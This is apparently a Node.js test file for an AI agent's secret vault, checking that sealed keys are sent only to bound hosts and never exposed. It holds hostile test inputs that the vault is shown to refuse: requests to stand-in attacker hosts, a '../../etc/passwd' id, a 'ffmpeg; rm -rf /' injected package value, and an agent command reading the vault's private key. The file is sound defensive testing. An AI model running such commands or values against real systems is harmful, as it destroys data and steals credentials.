"use strict";
// The vault: sign-ins and keys that live only on the agent's own computer,
// sealed in the owner's browser to the computer's key. The agent uses a key
// without ever seeing it, and its own commands run as an ordinary account that
// can't read the vault. Here the real vault program runs behind a stand-in for
// the computer provider, so every step is the one the computer would take.
const { test } = require("node:test");
const assert = require("node:assert/strict");
const crypto = require("node:crypto");
const fs = require("node:fs");
const http = require("node:http");
const os = require("node:os");
const path = require("node:path");
const { execFile } = require("node:child_process");
const { startLocal, loadModule } = require("../scripts/agent-id-local.cjs");

const { VAULT_VM_SCRIPT } = loadModule("vault/vm-script.ts");

// As the owner's browser does it (src/lib/agent-id/vault.ts): an AES-256-GCM
// key for the item, wrapped with RSA-OAEP-256 to the computer's public key.
function seal(publicKey, item) {
  const aes = crypto.randomBytes(32), iv = crypto.randomBytes(12);
  const cipher = crypto.createCipheriv("aes-256-gcm", aes, iv);
  const data = Buffer.concat([cipher.update(JSON.stringify(item)), cipher.final(), cipher.getAuthTag()]);
  const key = crypto.publicEncrypt({ key: publicKey, padding: crypto.constants.RSA_PKCS1_OAEP_PADDING, oaepHash: "sha256" }, aes);
  return { v: 1, key: key.toString("base64"), iv: iv.toString("base64"), data: data.toString("base64") };
}

// The agent's computer: the vault program in its own folder.
function computer(t) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "tw-vault-"));
  t.after(() => fs.rmSync(dir, { recursive: true, force: true }));
  const script = path.join(dir, "vault.js");
  fs.writeFileSync(script, VAULT_VM_SCRIPT);
  const home = path.join(dir, "home");
  const run = (op, input = {}) => new Promise(resolve => {
    const encoded = typeof input === "string" ? input : Buffer.from(JSON.stringify(input)).toString("base64");
    execFile(process.execPath, [script, op, encoded], { env: { ...process.env, AGENT_ID_VAULT_HOME: home, AGENT_ID_VAULT_TEST_HTTP: "1" } }, (_error, stdout) => resolve(JSON.parse(stdout)));
  });
  return { run, home };
}

// A website that says what it was sent.
async function echoServer(t) {
  const seen = [];
  const server = http.createServer((req, res) => {
    let body = "";
    req.on("data", chunk => { body += chunk; });
    req.on("end", () => {
      seen.push({ url: req.url, headers: req.headers, body });
      res.setHeader("content-type", "application/json");
      res.end(JSON.stringify({ url: req.url, authorization: req.headers.authorization || null, apiKey: req.headers["x-api-key"] || null, body }));
    });
  });
  await new Promise(resolve => server.listen(0, "127.0.0.1", resolve));
  t.after(() => server.close());
  return { base: `http://127.0.0.1:${server.address().port}`, seen };
}

test("the vault program: opens only what was sealed to it, never prints a secret, and sends a key only where it's bound", async t => {
  const { run, home } = computer(t);
  const site = await echoServer(t);
  const { publicKey } = await run("init");
  assert.match(publicKey, /^-----BEGIN PUBLIC KEY-----/);
  assert.equal((await run("init")).publicKey, publicKey, "The key pair is made once.");
  const id = n => `vlt_${String(n).padStart(24, "0")}`;

  const secret = "sk-live-0123456789abcdef";
  const described = await run("put", { id: id(1), envelope: seal(publicKey, { kind: "key", value: secret, hosts: ["api.example.com", "*.example.org"] }) });
  assert.deepEqual(described, { kind: "key", hosts: ["api.example.com", "*.example.org"], send: "bearer" });
  for (const file of fs.readdirSync(path.join(home, "items"))) assert.doesNotMatch(fs.readFileSync(path.join(home, "items", file), "utf8"), /sk-live/, "Kept sealed.");

  // Used: the key goes in the request, and comes back out of the reply.
  const used = await run("request", { id: id(1), url: `${site.base}/echo?x=1`, method: "POST", headers: { "Content-Type": "application/json", Authorization: "Bearer stolen?" }, body: "{\"q\":1}" });
  assert.equal(site.seen[0].headers.authorization, `Bearer ${secret}`, "Sent with the key, not with a header the agent chose.");
  assert.equal(site.seen[0].body, "{\"q\":1}");
  assert.equal(used.status, 200);
  assert.doesNotMatch(JSON.stringify(used), /sk-live/);
  assert.match(used.body, /Bearer \[hidden by vault\]/);
  // Elsewhere, or without https, it doesn't go.
  assert.equal((await run("request", { id: id(1), url: "https://evil.example/collect" })).error.code, "host_not_allowed");
  assert.equal((await run("request", { id: id(1), url: "http://api.example.com/" })).error.code, "https_only");

  // As a header, a parameter or a password: each taken back out.
  await run("put", { id: id(2), envelope: seal(publicKey, { kind: "key", value: "hdr-secret-value", hosts: ["api.example.com"], send: { as: "header", name: "X-Api-Key" } }) });
  assert.doesNotMatch(JSON.stringify(await run("request", { id: id(2), url: `${site.base}/h` })), /hdr-secret/);
  assert.equal(site.seen.at(-1).headers["x-api-key"], "hdr-secret-value");
  await run("put", { id: id(3), envelope: seal(publicKey, { kind: "key", value: "query secret+value", hosts: ["api.example.com"], send: { as: "query", name: "key" } }) });
  const query = await run("request", { id: id(3), url: `${site.base}/q` });
  assert.match(site.seen.at(-1).url, /key=query/);
  assert.doesNotMatch(JSON.stringify(query), /query(\+|%20| )secret/);
  await run("put", { id: id(4), envelope: seal(publicKey, { kind: "key", value: "basic-pass-1", hosts: ["api.example.com"], send: { as: "basic", username: "ada" } }) });
  assert.doesNotMatch(JSON.stringify(await run("request", { id: id(4), url: `${site.base}/b` })), /YWRhOmJhc2ljLXBhc3MtMQ|basic-pass/);

  // A sign-in: never shown, not even its username, and not usable in a request.
  const login = await run("put", { id: id(5), envelope: seal(publicKey, { kind: "login", site: "https://github.com/login", username: "ada", password: "hunter2-long", totp: "JBSWY3DPEHPK3PXP" }) });
  assert.deepEqual(login, { kind: "login", site: "https://github.com", totp: true });
  assert.equal((await run("request", { id: id(5), url: "https://github.com/" })).error.code, "wrong_kind");

  // Sealed to another computer, or not an item: refused.
  const other = crypto.generateKeyPairSync("rsa", { modulusLength: 2048, publicKeyEncoding: { type: "spki", format: "pem" }, privateKeyEncoding: { type: "pkcs8", format: "pem" } });
  assert.equal((await run("put", { id: id(6), envelope: seal(other.publicKey, { kind: "key", value: "x-secret-1", hosts: ["api.example.com"] }) })).error.code, "sealed_wrong");
  assert.equal((await run("put", { id: "../../etc/passwd", envelope: seal(publicKey, { kind: "key", value: "x-secret-1", hosts: ["api.example.com"] }) })).error.code, "invalid");
  assert.equal((await run("put", { id: id(7), envelope: seal(publicKey, { kind: "key", value: "x-secret-1", hosts: ["not a host"] }) })).error.code, "invalid");

  assert.deepEqual(await run("remove", { id: id(2) }), { removed: true });
  assert.equal((await run("request", { id: id(2), url: `${site.base}/h` })).error.code, "not_found");
});

// --- Through Agent ID: a live computer behind a stand-in for Azure -------------------

function network() {
  const routes = [], calls = [];
  const fetch = async (url, init = {}) => {
    const href = String(url), method = init.method || "GET";
    const call = { url: href, method, body: typeof init.body === "string" ? init.body : "" };
    calls.push(call);
    for (const [m, pattern, handler] of routes) {
      if (m !== method || !pattern.test(href)) continue;
      const result = await handler(new URL(href), call);
      return result instanceof Response ? result : new Response(JSON.stringify(result), { status: 200, headers: { "content-type": "application/json" } });
    }
    throw new Error(`Unexpected provider request: ${method} ${href}`);
  };
  return { fetch, calls, on: (method, pattern, handler) => routes.unshift([method, pattern, handler]), find: (method, pattern) => calls.filter(c => c.method === method && pattern.test(c.url)) };
}

// The agent's own command inside the wrapper that runs it as the agent's account.
function agentPart(command) {
  const match = /runuser -u agent -- .* bash -lc '[^']*' _ '((?:[^']|'\\'')*)' ([A-Za-z0-9+/=]+); else/.exec(command);
  return match ? { cwd: match[1].replace(/'\\''/g, "'"), command: Buffer.from(match[2], "base64").toString() } : null;
}

async function liveVault(t) {
  const azure = { AGENT_ID_LIVE: "vm", AZURE_TENANT_ID: "tenant", AZURE_CLIENT_ID: "client", AZURE_CLIENT_SECRET: "secret", AZURE_SUBSCRIPTION_ID: "sub", AZURE_SANDBOX_RESOURCE_GROUP: "rg", AZURE_SANDBOX_GROUP: "agents" };
  const net = network();
  const local = await startLocal({ fetch: net.fetch, env: azure });
  t.after(() => local.close());
  const { run } = computer(t);
  let state = "Suspended";
  const agentCommands = [];
  net.on("POST", /oauth2\/v2\.0\/token$/, () => ({ access_token: "azure-token", expires_in: 3600 }));
  net.on("PUT", /\/sandboxes\?api-version=/, () => ({ id: "sbx-1", state: "Suspended" }));
  net.on("GET", /\/sandboxes\/sbx-1\?api-version=/, () => ({ id: "sbx-1", state }));
  net.on("POST", /\/resume\?/, () => { state = "Running"; return {}; });
  net.on("POST", /\/stop\?/, () => { state = "Suspended"; return {}; });
  net.on("POST", /executeShellCommand/, async (_url, call) => {
    const { command } = JSON.parse(call.body);
    const vault = /vault\.js (init|put|remove|request) ([A-Za-z0-9+/=]+)/.exec(command);
    if (vault) return { exitCode: 0, stdout: JSON.stringify(await run(vault[1], vault[2])), stderr: "" };
    agentCommands.push(command);
    return { exitCode: 0, stdout: "ok\n", stderr: "" };
  });
  const ok = async (method, url, init) => {
    const response = await local.call(method, url, init);
    assert.ok(response.status < 300, `${method} ${url} → ${response.status} ${JSON.stringify(response.body)}`);
    return response.body;
  };
  const terms = (await ok("GET", "/v1/config")).legal.termsVersion;
  const ada = await local.user({ email: "ada@example.com" });
  await ok("POST", "/v1/account/terms", { token: ada.session, body: { version: terms } });
  const created = await ok("POST", "/v1/agents", { token: ada.session, body: { name: "Builder" } });
  return { local, net, ok, ada, bot: { ...created.agent, key: created.secret }, agentCommands };
}

test("an agent's vault: set up on its computer, filled sealed from the browser, keys used without being seen", async t => {
  const { local, ok, ada, bot, agentCommands } = await liveVault(t);
  const vault = `/v1/agents/${bot.id}/vault`;
  assert.deepEqual((await ok("GET", vault, { token: ada.session })).vault, { computer: "none", ready: false, publicKey: null, test: false });
  const ownerKey = (await ok("POST", "/v1/keys", { token: ada.session, body: { name: "cli" } })).secret;
  assert.equal((await local.call("POST", `${vault}/setup`, { token: ownerKey, body: {} })).body.error.code, "session_required");

  // Setting up gives the agent its computer, then the vault on it.
  const set = await ok("POST", `${vault}/setup`, { token: ada.session, body: {} });
  assert.deepEqual([set.vault.computer, set.vault.ready], ["ready", true]);
  const publicKey = set.vault.publicKey;
  assert.match(publicKey, /^-----BEGIN PUBLIC KEY-----/);

  const secret = "ghp_secretTokenValue12345";
  const added = await ok("POST", `${vault}/items`, { token: ada.session, body: { label: "GitHub API", envelope: seal(publicKey, { kind: "key", value: secret, hosts: ["api.github.com"] }) } });
  assert.deepEqual([added.item.kind, added.item.label, added.item.hosts, added.item.send], ["key", "GitHub API", ["api.github.com"], "bearer"]);
  const signIn = await ok("POST", `${vault}/items`, { token: ada.session, body: { label: "GitHub", envelope: seal(publicKey, { kind: "login", site: "https://github.com", username: "ada", password: "pw-github-long" }) } });
  assert.deepEqual([signIn.item.kind, signIn.item.site], ["login", "https://github.com"]);
  assert.equal((await local.call("POST", `${vault}/items`, { token: ownerKey, body: { label: "x", envelope: seal(publicKey, { kind: "key", value: "zzzz-1", hosts: ["a.example.com"] }) } })).body.error.code, "session_required", "Secrets go in from the website only.");
  assert.equal((await local.call("POST", `${vault}/items`, { token: bot.key, body: {} })).status, 403, "Never by the agent.");

  // Nothing Agent ID keeps holds a secret.
  const kept = JSON.stringify((await local.db.query("select * from agent_id_vault_items")).rows)
    + JSON.stringify((await local.db.query("select state from agent_id_resources")).rows)
    + JSON.stringify((await local.db.query("select * from agent_id_audit")).rows);
  for (const value of [secret, "pw-github-long", "\"ada\""]) assert.ok(!kept.includes(value), `${value} isn't kept by Agent ID.`);

  // The agent sees names and sites, and uses the key by asking for a request.
  const listed = await ok("GET", "/v1/me/vault", { token: bot.key });
  assert.deepEqual(listed.items.map(i => [i.kind, i.label]), [["key", "GitHub API"], ["login", "GitHub"]]);
  assert.doesNotMatch(JSON.stringify(listed), /ghp_|pw-github/);
  const refused = await local.call("POST", "/v1/me/vault/request", { token: bot.key, body: { item: added.item.id, url: "https://attacker.example/steal" } });
  assert.equal(refused.body.error.code, "host_not_allowed");
  const site = await echoServer(t);
  const used = await ok("POST", "/v1/me/vault/request", { token: bot.key, body: { item: added.item.id, url: `${site.base}/user`, method: "GET" } });
  assert.equal(site.seen[0].headers.authorization, `Bearer ${secret}`);
  assert.doesNotMatch(JSON.stringify(used), /ghp_/);
  const log = (await ok("GET", "/v1/audit", { token: ada.session })).entries.map(e => e.action);
  for (const action of ["vault.setup", "vault.item_added", "vault.request"]) assert.ok(log.includes(action), action);

  // The agent's own commands run as its ordinary account.
  await ok("POST", "/v1/me/vm/exec", { token: bot.key, body: { command: "cat /var/lib/agent-id-vault/key.pem", cwd: "~/work" } });
  const wrapped = agentCommands.at(-1);
  assert.match(wrapped, /^if \[ "\$\(id -u\)" = 0 \]; then id -u agent .*exec runuser -u agent -- env -i HOME=\/home\/agent /);
  assert.deepEqual(agentPart(wrapped), { cwd: "~/work", command: "cat /var/lib/agent-id-vault/key.pem" });
  // Packages come from the system's sources, by name.
  assert.equal((await local.call("POST", "/v1/me/vm/install", { token: bot.key, body: { packages: "ffmpeg; rm -rf /" } })).status, 400);
  await ok("POST", "/v1/me/vm/install", { token: bot.key, body: { packages: "ffmpeg python3-pip" } });
  assert.match(agentCommands.at(-1), /apt-get install -y -qq --no-install-recommends -- 'ffmpeg' 'python3-pip'$/);

  // Removed from the computer too.
  await ok("DELETE", `${vault}/items/${added.item.id}`, { token: ada.session });
  assert.deepEqual((await ok("GET", vault, { token: ada.session })).items.map(i => i.label), ["GitHub"]);
  assert.equal((await local.call("POST", "/v1/me/vault/request", { token: bot.key, body: { item: added.item.id, url: `${site.base}/user` } })).status, 404);

  // A computer the agent once had root on can't hold a vault: it's replaced first.
  await local.db.query("update agent_id_resources set state = state - 'rootFree' where kind = 'vm'");
  assert.equal((await local.call("POST", `${vault}/setup`, { token: ada.session, body: {} })).body.error.code, "computer_replace");
  assert.equal((await ok("GET", vault, { token: ada.session })).vault.computer, "replace");
});

test("a test computer's vault (development) works the same with a test key kept by Agent ID, never shown", async t => {
  const local = await startLocal({ env: {} });
  t.after(() => local.close());
  const ok = async (method, url, init) => { const r = await local.call(method, url, init); assert.ok(r.status < 300, `${method} ${url} → ${r.status} ${JSON.stringify(r.body)}`); return r.body; };
  const terms = (await ok("GET", "/v1/config")).legal.termsVersion;
  const ada = await local.user();
  await ok("POST", "/v1/account/terms", { token: ada.session, body: { version: terms } });
  const created = await ok("POST", "/v1/agents", { token: ada.session, body: { name: "Builder" } });
  const vault = `/v1/agents/${created.agent.id}/vault`;
  const { vault: status } = await ok("POST", `${vault}/setup`, { token: ada.session, body: {} });
  assert.deepEqual([status.ready, status.test], [true, true]);
  const { item } = await ok("POST", `${vault}/items`, { token: ada.session, body: { label: "Stripe", envelope: seal(status.publicKey, { kind: "key", value: "sk_test_abcdef", hosts: ["api.stripe.com"] }) } });
  const used = await ok("POST", "/v1/me/vault/request", { token: created.secret, body: { item: item.id, url: "https://api.stripe.com/v1/balance" } });
  assert.match(used.body, /Test computer: this GET would go to api\.stripe\.com with the key added/);
  assert.equal((await local.call("POST", "/v1/me/vault/request", { token: created.secret, body: { item: item.id, url: "https://evil.example/" } })).body.error.code, "host_not_allowed");
  const shown = JSON.stringify(await ok("GET", `/v1/agents/${created.agent.id}`, { token: ada.session }));
  assert.doesNotMatch(shown, /PRIVATE KEY|testVault/, "The test key isn't shown.");
});

test("an agent's command, wrapped, runs as written in its folder (where the computer isn't root, as it always did)", { skip: require("node:child_process").spawnSync("bash", ["-c", "true"]).status !== 0 }, t => {
  const { agentCommand } = loadModule("vault/shell.ts");
  const home = fs.mkdtempSync(path.join(os.tmpdir(), "tw-agent-"));
  t.after(() => fs.rmSync(home, { recursive: true, force: true }));
  fs.mkdirSync(path.join(home, "work"));
  const { spawnSync } = require("node:child_process");
  const sh = (command, cwd) => spawnSync("bash", ["-c", agentCommand(command, cwd)], { env: { ...process.env, HOME: home }, encoding: "utf8" });
  const quoted = sh(`printf '%s|' "it's" "$(basename "$PWD")" ; echo done`, "~/work");
  assert.equal(quoted.stdout.trim(), "it's|work|done");
  assert.equal(sh("exit 7", "~").status, 7, "The command's exit code comes back.");
  assert.notEqual(sh("true", "~/missing").status, 0, "A folder that isn't there fails.");
});
